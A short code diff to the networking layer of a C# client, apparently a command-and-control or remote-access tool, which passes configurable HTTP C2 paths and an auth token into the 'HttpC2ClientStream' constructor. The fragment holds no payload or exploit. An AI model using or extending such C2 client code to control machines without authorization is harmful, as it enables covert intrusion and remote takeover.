@@ -9,6 +9,7 @@ using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Utilities;
 using Pulsar.Client.Config;
+using Pulsar.Common.Models;
 using System;
 using System.Diagnostics;
 using System.Security.Cryptography.X509Certificates;
@@ -219,7 +220,10 @@ namespace Pulsar.Client.Networking
             }
 
             CurrentEndpoint = builder.Uri.ToString();
-            var stream = new HttpC2ClientStream(builder.Uri);
+            var stream = new HttpC2ClientStream(
+                builder.Uri,
+                Settings.HTTPC2PATHS ?? new HttpC2Paths(),
+                Settings.HTTPC2TOKEN);
             AttachStream(stream);
         }
 
